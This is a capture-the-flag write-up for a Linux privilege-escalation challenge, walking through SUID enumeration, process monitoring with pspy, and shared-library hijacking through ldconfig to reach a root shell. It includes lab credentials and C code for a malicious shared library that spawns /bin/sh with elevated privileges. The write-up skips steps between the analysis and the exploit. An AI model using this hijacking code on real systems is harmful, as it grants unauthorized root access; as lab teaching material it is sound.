# BlackOps

### Category

System

### Description

You asked a friend to set you up with a few samples of http server in different languages for you to test out. He opened an access to one of his machines. He didn't give you admin access, but maybe there is a way to play a trick on him ;)

The base credentials are:
```
user1:password123
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Note to run the challenge

Run the docker with SYS_PTRACE capibiltiy enabled.
```
docker run -p 22:22 --cap-add=SYS_PTRACE  blackops
```

### Write up

First thing we notice, is the `servers` folder. There is the following note in it:
```
Hi !

Here is the servers sample you ordered. I had troubles with some libraries on a few test systems. Removing them does the trick for now, until I find a fix.
For security reasons, you can't edit any files, but I copied you an SUID enabled copy of the rm binary, if you need to remove files in order to run the project.

Cheers
```
So we have a SUID rm binary. GTFObins does not reference a way to elevate privileges with the rm binary, so there is little chance that this alone is the way to root.

Let's check if there are other SUID enabled binaries.
```
$ find / -perm -4000 2> /dev/null
/bin/su
/bin/umount
/bin/mount
/home/user1/servers/utils/restart_servers
/home/user1/servers/rm
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
```

`/home/user1/servers/utils/restart_servers` is in the same folder, let's check it out.

```
$ file restart_servers 
restart_servers: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=037d8a491f80ebc4daa6f9c41815f0b3d49cef82, stripped
$ ./restart_servers 
[*] Cleaning all ports
	[*] Killing port 9090
	[*] Killing port 9091
	[*] Killing port 9092
[*] All ports cleaned
[*] Restart services
[*] Services restarted
```
Based on the binary output, it's used to kill the servers, free the used ports, and restart the servers.

Let's check what is going on when the binary is ran. To achieve this, I'm going to us the pspy binary.

```
scp -P 22 pspy64s user1@localhost:~
```

Let's run it and check the processes.

```
2022/05/16 13:05:47 CMD: UID=0    PID=138    | ./restart_servers 
2022/05/16 13:05:47 CMD: UID=0    PID=139    | sh -c /sbin/ldconfig 
2022/05/16 13:05:47 CMD: UID=0    PID=140    | /bin/sh /sbin/ldconfig 
2022/05/16 13:05:47 CMD: UID=0    PID=141    | /bin/kc 
2022/05/16 13:05:47 CMD: UID=0    PID=142    | /bin/fuser 9090/tcp -k 
2022/05/16 13:05:47 CMD: UID=0    PID=143    | /bin/fuser 9091/tcp -k 
2022/05/16 13:05:47 CMD: UID=0    PID=144    | /bin/fuser 9092/tcp -k 
2022/05/16 13:05:47 CMD: UID=0    PID=147    | /usr/bin/python3 /home/user1/servers/src/server.py 
2022/05/16 13:05:47 CMD: UID=0    PID=146    | /home/user1/servers/src/server.go 
2022/05/16 13:05:47 CMD: UID=0    PID=145    | /usr/bin/node /home/user1/servers/src/server.js 
```
There are a few things going on here. Our binary runs other processes:
 - ldconfig: configure dynamic linker run-time bindings
 - kc: ???
 - fuser:  identify processes using files or sockets, used to kill processes on specific ports
 - server.py
 - server.go
 - server.js


```c
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void genports() {
        printf("[%] Running exploit\n");
        setreuid(geteuid(), geteuid());
        execve("/bin/sh", 0, 0);
}
```

```bash
gcc -fPIC -shared -o libgenports.so exploit.c
/etc/ld.so.conf.d/servers.conf
```

### Flag

```
Hero{h1j4cked_l1k3_1n_Bl4ck_0ps}
```
